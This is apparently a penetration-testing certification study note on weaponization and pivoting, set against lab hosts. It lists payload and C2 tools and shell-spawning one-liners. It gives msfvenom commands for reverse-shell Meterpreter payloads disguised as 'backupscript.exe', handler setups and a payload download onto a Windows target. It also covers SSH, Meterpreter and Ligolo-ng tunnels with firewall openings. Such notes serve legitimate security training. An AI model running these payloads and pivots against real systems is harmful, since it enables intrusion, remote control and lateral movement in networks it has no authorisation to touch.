---
title: "Weaponization"
date: 2026-03-31 10:14:00 +0000
categories: [Certifications Technical Notes, Certified Penetration Testing Specialist (CPTS)]
tags: [networking, offensive security]
---


## Shells and Payloads

### Payload generation


| **Resource** | **Description** |
| --- | --- |
| `MSFVenom & Metasploit-Framework` | [MSF](https://github.com/rapid7/metasploit-framework) is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. |
| `Payloads All The Things` | [In this repo](https://github.com/swisskyrepo/PayloadsAllTheThings) you can find many different resources and cheat sheets for payload generation and general methodology. |
| `Mythic C2 Framework` | [The Mythic C2 framework](https://github.com/its-a-feature/Mythic) is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation. |
| `Nishang` | [Nishang](https://github.com/samratashok/nishang) is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester. |
| `Darkarmour` | [Darkarmour](https://github.com/bats3c/darkarmour) is a tool to generate and utilize obfuscated binaries for use against Windows hosts. |
| `revshells.com` | [revshells.com](https://revshells.com/) is a website that provides a list of reverse shells for different programming languages. **My favorite** |


### Spawning Interactive Shells

| **Method** | **Command** | **Notes** |
|---|---|---|
| `/bin/sh` | `/bin/sh -i` | |
| `python3` | `python3 -c 'import pty; pty.spawn("/bin/sh")'` | |
| `python2` | `python2 -c 'import pty; pty.spawn("/bin/sh")'` | |
| `perl` | `perl -e 'exec "/bin/sh";'` | Run from script: `exec "/bin/sh";` |
| `ruby` | `exec "/bin/sh"` | Run from script |
| `lua` | `os.execute('/bin/sh')` | Run from script |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` | |
| `find` | `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` | No shell if file not found |
| `find` | `find . -exec /bin/sh \; -quit` | |
| `vim` | `vim -c ':!/bin/sh'` | Direct vim to shell |
| `vim escape` | `vim` then `:set shell=/bin/sh` then `:shell` | Multi-step escape |

## Pivoting and Port Forwarding

### Dynamic Port Forwarding with SSH and SOCKS Tunneling

#### SSH Local Port Forwarding

```bash
# Single port forward
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

# Verify with nmap
nmap -p1234 localhost -sV

# Multiple port forwards
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

---

#### SSH Tunneling Over SOCKS Proxy

> SOCKS4 does not provide authentication, SOCKS5 does.

1. Enable dynamic port forwarding with SSH
```bash
    ssh -D 9050 ubuntu@10.129.202.64
```

2. Configure `proxychains`
```bash
    tail -4 /etc/proxychains.conf
    # defaults set to "tor"
    socks4  127.0.0.1 9050
```

3. Route packets through the proxy (full TCP scan required)
```bash
    # Host discovery (won't work on Windows hosts)
    proxychains nmap -v -sn 172.16.5.1-200

    # TCP scan
    proxychains nmap -v -Pn -sT 172.16.5.0/24
```

---

#### Using Metasploit with Proxychains

1. Start Metasploit through proxychains
```bash
    proxychains msfconsole
```

2. Set target to the internal host discovered via nmap
```bash
    set rhosts 172.16.5.19
```

---

### Remote / Reverse Port Forwarding with SSH

1. Create a Windows payload with msfvenom
```bash
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

2. Configure and start `multi/handler`
```bash
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_https
    set lhost 0.0.0.0
    set lport 8000
    run
```

3. Transfer payload to pivot host (Linux host)
```bash
    scp backupscript.exe ubuntu@<pivothostip>:~/
```

4. Upload payload to target (Windows host)
```bash
    # On pivot host
    python3 -m http.server 8123
```
```powershell
    # On Windows target
    Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

5. Start SSH reverse tunnel (`-vN`: verbose, no shell)
```bash
    ssh -R <internal-ip-of-pivot-host>:8080:0.0.0.0:8000 ubuntu@<ip-address-of-target> -vN
```

---

### Meterpreter Tunneling & Port Forwarding

#### Pivot via Meterpreter Session

1. Create payload for Ubuntu pivot host
```bash
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.184 -f elf -o backupjob LPORT=8080
```

2. Configure and start `multi/handler`
```bash
    use exploit/multi/handler
    set lhost 0.0.0.0
    set lport 8080
    set payload linux/x64/meterpreter/reverse_tcp
    run
```

3. Copy and execute the binary on the pivot host

4. Ping sweep through Meterpreter
```bash
    run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

5. Configure MSF SOCKS proxy
```bash
    use auxiliary/server/socks_proxy
    set SRVPORT 9050
    set SRVHOST 0.0.0.0
    set version 4a
    run

    # Confirm proxy is running
    jobs
```

6. Add line to `proxychains.conf` if needed
```bash
    socks4  127.0.0.1 9050
```

7. Create routes with autoroute
```bash
    use post/multi/manage/autoroute
    set SESSION 1
    set SUBNET 172.16.6.0
    run

    # Or directly from Meterpreter session
    run autoroute -s 172.16.6.0/23
```

8. List active routes
```bash
    run autoroute -p
```

9. Test proxy and routing
```bash
    proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

---

#### Port Forwarding

1. Create local TCP relay

    ```bash
    portfwd add -l 3300 -p 3389 -r 172.16.5.19
    ```

2. Test the forward

    ```bash
    xfreerdp /v:localhost:3300 /u:victor /p:pass@123
    netstat -antp
    ```

---

#### Meterpreter Reverse Port Forwarding

1. Add reverse port forwarding rule
```bash
    portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

2. Configure and start `multi/handler`
```bash
    bg
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set LPORT 8081
    set LHOST 0.0.0.0
    run
```

3. Generate Windows payload (connects back to Ubuntu pivot)
```bash
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

---

#### Ping Sweep One-liners

> Attempt at least twice.

```bash
for i in {1..254} ;do (ping -c 1 172.18.0.$i | grep "bytes from" &) ;done
```

```powershell
for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"

1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
```

---

### Ligolo-ng

#### Setting Up the Connection

1. Download the agent on the target machine

2. Start the Ligolo proxy on Kali
```bash
    sudo ligolo-proxy -selfcert
```

3. Connect the agent to the proxy on port 11601
```bash
    # Linux
    ./agent -connect <proxy-ip>:11601 -ignore-cert

    # Windows
    .\agent.exe -connect <proxy-ip>:11601 -ignore-cert
```

---

#### Configuring Routing

1. Start tunnel from Ligolo proxy CLI
```
    session
    # select agent session
    start
```

2. Create a new interface and add a route
```
    autoroute
    # Select -> Create new interface
    # Type   -> Interface name or select random name
    # Select -> Network subnet from the agent's machine
```

---

#### Listeners

- Forwarding Traffic

    ```bash
    listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:11601
    ```

---

- Port Forwarding

1. Open the port on the target machine firewall
```powershell
    # Windows
    netsh advfirewall firewall add rule name="Ligolo-ng 8888 TCP" dir=in action=allow protocol=TCP localport=8888
```
```bash
    # Linux
    iptables -I INPUT -p tcp --dport 8888 -j ACCEPT
```

2. Forward the port to the proxy or another pivot (double pivot)
```bash
    # First agent (forward to Kali)
    listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:8888

    # Second agent (forward to internal host)
    listener_add --addr 0.0.0.0:8888 --to 172.16.139.10:8888
```